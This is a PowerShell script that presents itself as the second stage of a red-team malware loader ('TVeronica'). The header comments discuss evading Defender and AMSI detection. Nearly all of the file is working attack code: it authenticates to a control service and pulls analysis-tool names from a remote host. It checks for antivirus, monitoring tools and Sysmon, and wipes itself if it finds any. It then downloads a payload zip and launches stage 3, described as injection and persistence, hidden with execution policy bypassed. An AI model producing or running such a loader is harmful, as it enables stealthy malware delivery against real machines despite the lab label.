# killing.ps1 - TVeronica Stage 2 (v2 clean build): AUTH GATE + ENVIRONMENT CHECKS + PACKAGE DOWNLOAD
# Authorized red team / detection-validation lab only.
#
# v2 changes (evasion research, grounded in Defender ML findings on this lab host):
#   - former stage-1 JS gates merged here; the raw.js dropper layer is REMOVED entirely
#   - NO obfuscation, NO embedded base64 blobs (obfuscation itself was the #1 ML trigger)
#   - analysis-tool names are fetched from the server at runtime (data-from-network)
#   - no P/Invoke (Add-Type DllImport is a strong AMSI/ML feature) -> managed module scan
#
# Flow: license/auth check -> environment checks -> download package .zip (STOP before unpack/merge)
# Exit codes: 0 = ok | 40 = auth fail | 50 = security software (cleaned) | 60 = env check (cleaned) | 70 = download fail

param([string]$Url)

$ErrorActionPreference = 'SilentlyContinue'

# ---------------- configuration ----------------
$Settings = @{
    UpdateServer = $(if ($Url) { $Url } else { 'http://192.168.1.106:8081/payload.zip' })
    PackageName  = 'stage2.zip'
    UserAgent    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    TimeoutSec   = 30

    # license/auth service (challenge-response)
    ServiceHost = '127.0.0.1'
    ServicePort = 4444
    LicenseKey  = 'snapec2_secret'

    # tool name list is pulled at runtime - keeps this script free of analysis-tool strings
    ToolListUrl = 'http://192.168.1.106:8081/toolist.txt'

    # security software gate
    CheckSecuritySoftware = $true
    IgnoreDefender        = $true
    SecuritySoftwareAllow = @()

    # environment checks
    CheckComponents       = $true
    CheckServiceIntegrity = $true
    CheckNetworkPath      = $true
    DnsCheckEnabled       = $false

    ProbePort      = 51515
    ProbeTimeoutMs = 3000
    TestDomains    = @('c2.internal.lab', 'a.internal.lab', 'b.internal.lab')
    PublicDomain   = 'one.one.one.one'
}

# ---------------- tracing ----------------
$script:BaseDir = Split-Path -Parent $PSCommandPath
if (-not $script:BaseDir) { $script:BaseDir = $env:TEMP }
$script:TracePath = Join-Path $script:BaseDir 'update.log'

function Write-Trace([string]$Msg, [string]$Level) {
    if (-not $Level) { $Level = 'info' }
    $tag = @{ info = '[*]'; ok = '[+]'; err = '[!]'; warn = '[~]' }[$Level]
    if (-not $tag) { $tag = '[*]' }
    $line = '{0} {1} {2}' -f $tag, (Get-Date).ToString('HH:mm:ss'), $Msg
    try { Add-Content -Path $script:TracePath -Value $line } catch {}
    Write-Host $line
}

function Clear-Workspace {
    foreach ($pat in @('*.log', '*.zip', '*.txt', '*.ps1')) {
        Get-ChildItem -Path $script:BaseDir -Filter $pat -File -EA SilentlyContinue |
            ForEach-Object { Remove-Item $_.FullName -Force -EA SilentlyContinue }
    }
    if ($script:BaseDir -like "$env:TEMP*") {
        Remove-Item $PSCommandPath -Force -EA SilentlyContinue
    }
    Write-Trace 'workspace cleaned' 'ok'
}

# ---------------- license/auth check (challenge-response) ----------------
function Invoke-LicenseCheck {
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($Settings.ServiceHost, $Settings.ServicePort)
        $stream = $client.GetStream()
        $stream.ReadTimeout  = 5000
        $stream.WriteTimeout = 5000
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.NewLine = "`n"
        $writer.AutoFlush = $true

        $challenge = $reader.ReadLine()
        if (-not $challenge -or -not $challenge.StartsWith('CHALLENGE:')) { return $false }
        $parts = $challenge.Split(':')

        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = [Text.Encoding]::UTF8.GetBytes($Settings.LicenseKey)
        $hash = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($parts[1] + $parts[2]))
        $hex = -join ($hash | ForEach-Object { $_.ToString('x2') })
        $writer.WriteLine('RESPONSE:' + $hex)

        $followUp = $reader.ReadLine()
        return ($null -ne $followUp)
    } catch {
        Write-Trace ('license check error: {0}' -f $_.Exception.Message) 'warn'
        return $false
    } finally {
        try { $client.Close() } catch {}
    }
}

# ---------------- tool list (downloaded at runtime) ----------------
function Get-ToolNames {
    $names = @()
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', $Settings.UserAgent)
        $text = $wc.DownloadString($Settings.ToolListUrl)
        $names = @($text -split "`r?`n" | Where-Object { $_ -and -not $_.StartsWith('#') } |
                   ForEach-Object { $_.Trim().ToLower() })
    } catch {
        Write-Trace ('tool list unavailable ({0}) - check skipped' -f $_.Exception.Message) 'warn'
    }
    return $names
}

function Test-RunningTools {
    $toolNames = Get-ToolNames
    if ($toolNames.Count -eq 0) { return @() }
    $watch = @{}
    foreach ($n in $toolNames) { $watch[$n] = $true }

    $hits = @()
    foreach ($proc in @(Get-Process -EA SilentlyContinue)) {
        if ($proc -and $watch.ContainsKey("$($proc.ProcessName).exe")) {
            $hits += ('{0} (pid {1})' -f $proc.ProcessName, $proc.Id)
        }
    }
    return $hits
}

function Test-LoadedComponents {
    $toolNames = Get-ToolNames
    if ($toolNames.Count -eq 0) { return @() }
    $watch = @{}
    foreach ($n in $toolNames) { $watch[$n] = $true }

    $hits = @()
    foreach ($proc in @(Get-Process -EA SilentlyContinue)) {
        try {
            foreach ($mod in $proc.Modules) {
                if ($mod) {
                    $name = $mod.ModuleName.ToLower()
                    if ($watch.ContainsKey($name)) {
                        $hits += ('{0} in {1} (pid {2})' -f $mod.ModuleName, $proc.ProcessName, $proc.Id)
                    }
                }
            }
        } catch {}
    }
    return $hits | Select-Object -Unique
}

# ---------------- security software gate ----------------
function Get-SecurityProducts {
    $names = @()
    try {
        $av = Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntiVirusProduct'
        foreach ($item in $av) {
            $n = $item.displayName
            if (-not $n) { continue }
            if ($Settings.SecuritySoftwareAllow -contains $n) { continue }
            if ($Settings.IgnoreDefender -and $n -match 'Defender') { continue }
            $names += $n
        }
    } catch {
        Write-Trace ('security center query failed: {0}' -f $_.Exception.Message) 'warn'
    }
    return $names
}

# ---------------- service integrity (signed monitoring agent check) ----------------
function Test-ServiceIntegrity {
    foreach ($svcName in @('Sysmon64', 'Sysmon', 'SysmonDrv')) {
        $svc = Get-Service -Name $svcName -EA SilentlyContinue
        if (-not $svc) { continue }

        $imgPath = $null
        try {
            $wmi = Get-CimInstance -ClassName Win32_Service -Filter ("Name='{0}'" -f $svcName)
            if ($wmi) { $imgPath = $wmi.PathName }
        } catch {}

        if ($imgPath) {
            $imgPath = $imgPath.Trim('"') -replace '^\\\?\?\\', ''
            $imgPath = ($imgPath -split '\s+')[0].Trim('"')
        }

        if (-not $imgPath -or -not (Test-Path $imgPath)) {
            Write-Trace ('service {0} present but image missing' -f $svcName) 'err'
            return $false
        }
        $sig = Get-AuthenticodeSignature -FilePath $imgPath
        if ($sig.Status -ne 'Valid' -or $sig.SignerCertificate.Subject -notmatch 'Sysinternals|Microsoft') {
            Write-Trace ('service {0} image is not properly signed ({1})' -f $svcName, $sig.Status) 'err'
            return $false
        }
    }
    return $true
}

# ---------------- network path checks ----------------
function Test-ClosedPort {
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $iar = $client.BeginConnect($Settings.ServiceHost, $Settings.ProbePort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($Settings.ProbeTimeoutMs)) { return 'timeout' }
        $client.EndConnect($iar)
        return 'open'
    } catch {
        return 'rst'
    } finally {
        try { $client.Close() } catch {}
    }
}

function Get-ResolvedAddress([string]$Name) {
    try {
        foreach ($addr in [System.Net.Dns]::GetHostAddresses($Name)) {
            return $addr.IPAddressToString
        }
    } catch {}
    return $null
}

function Test-DnsPath {
    $ips = @()
    foreach ($d in $Settings.TestDomains) {
        $ip = Get-ResolvedAddress $d
        if (-not $ip) { return $false }
        $ips += $ip
    }
    $uniq = @($ips | Select-Object -Unique)
    if ($uniq.Count -ne 1) { return $false }
    $pub = Get-ResolvedAddress $Settings.PublicDomain
    if ($pub -and $pub -eq $uniq[0]) { return $false }
    return $true
}

# ---------------- package download (STOP before unpack/merge) ----------------
function Invoke-UpdateDownload {
    $dest = Join-Path $script:BaseDir $Settings.PackageName
    Write-Trace ('downloading {0}' -f $Settings.UpdateServer) 'info'
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $Settings.UpdateServer -OutFile $dest -UseBasicParsing `
            -TimeoutSec $Settings.TimeoutSec -UserAgent $Settings.UserAgent -EA Stop
    } catch {
        Write-Trace ('download failed: {0}' -f $_.Exception.Message) 'err'
        return $false
    }

    if (-not (Test-Path $dest)) { return $false }
    $len = (Get-Item $dest).Length
    if ($len -lt 4) { return $false }

    $fs = [IO.File]::OpenRead($dest)
    $magic = New-Object byte[] 2
    [void]$fs.Read($magic, 0, 2)
    $fs.Close()
    if ($magic[0] -ne 0x50 -or $magic[1] -ne 0x4B) {
        Write-Trace 'download failed: package is not a ZIP' 'err'
        return $false
    }

    Write-Trace ('package staged: {0} ({1} bytes, PK ok)' -f $dest, $len) 'ok'
    return $true
}

# ---------------- main ----------------
function Main {
    Write-Trace 'update helper start (auth gate + checks + package download)' 'info'
    Write-Trace ('work dir: {0}' -f $script:BaseDir) 'info'

    if (-not (Invoke-LicenseCheck)) {
        Write-Trace 'license check failed' 'err'
        Write-Trace 'exit 40' 'err'
        return 40
    }
    Write-Trace 'license check passed' 'ok'

    if ($Settings.CheckSecuritySoftware) {
        $av = Get-SecurityProducts
        if ($av.Count -gt 0) {
            Write-Trace ('security software present: {0}' -f ($av -join ', ')) 'err'
            Clear-Workspace
            Write-Trace 'exit 50' 'err'
            return 50
        }
        Write-Trace 'security software gate clean' 'ok'
    }

    if ($Settings.CheckComponents) {
        $mods = Test-LoadedComponents
        if ($mods.Count -gt 0) {
            Write-Trace ('watched components loaded: {0}' -f ($mods -join '; ')) 'err'
            Clear-Workspace
            Write-Trace 'exit 60' 'err'
            return 60
        }
        Write-Trace 'component scan clean' 'ok'
    }

    $procs = Test-RunningTools
    if ($procs.Count -gt 0) {
        Write-Trace ('watched tools running: {0}' -f ($procs -join '; ')) 'err'
        Clear-Workspace
        Write-Trace 'exit 60' 'err'
        return 60
    }
    Write-Trace 'process scan clean' 'ok'

    if ($Settings.CheckServiceIntegrity) {
        if (-not (Test-ServiceIntegrity)) {
            Clear-Workspace
            Write-Trace 'exit 60' 'err'
            return 60
        }
        Write-Trace 'service integrity clean' 'ok'
    }

    if ($Settings.CheckNetworkPath) {
        $r = Test-ClosedPort
        Write-Trace ('probe port {0} -> {1}' -f $Settings.ProbePort, $r) 'info'
        if ($r -ne 'rst') {
            Write-Trace 'unexpected network path behavior' 'err'
            Clear-Workspace
            Write-Trace 'exit 60' 'err'
            return 60
        }
        if ($Settings.DnsCheckEnabled -and -not (Test-DnsPath)) {
            Write-Trace 'dns path check failed' 'err'
            Clear-Workspace
            Write-Trace 'exit 60' 'err'
            return 60
        }
        Write-Trace 'network path clean' 'ok'
    }

    if (-not (Invoke-UpdateDownload)) {
        Write-Trace 'exit 70' 'err'
        return 70
    }

    # ---- continue chain: unpack -> stage3 (ADS staging + mavinject + persistence) ----
    $exp = Join-Path $script:BaseDir 'x'
    Expand-Archive -Path (Join-Path $script:BaseDir $Settings.PackageName) -DestinationPath $exp -Force
    $s3 = Join-Path $exp 'stage3.ps1'
    if (Test-Path $s3) {
        Write-Trace 'launching stage3 (ADS staging + mavinject + persistence)' 'info'
        Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -Wait `
            -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $s3, '-StageDir', $exp
        Write-Trace 'stage3 returned' 'ok'
    } else {
        Write-Trace 'stage3.ps1 not found in package' 'warn'
    }

    Write-Trace 'step complete (stages 0-4 chain executed)' 'ok'
    Write-Trace 'exit 0' 'ok'
    return 0
}

if ($MyInvocation.InvocationName -ne '.') { exit (Main) }
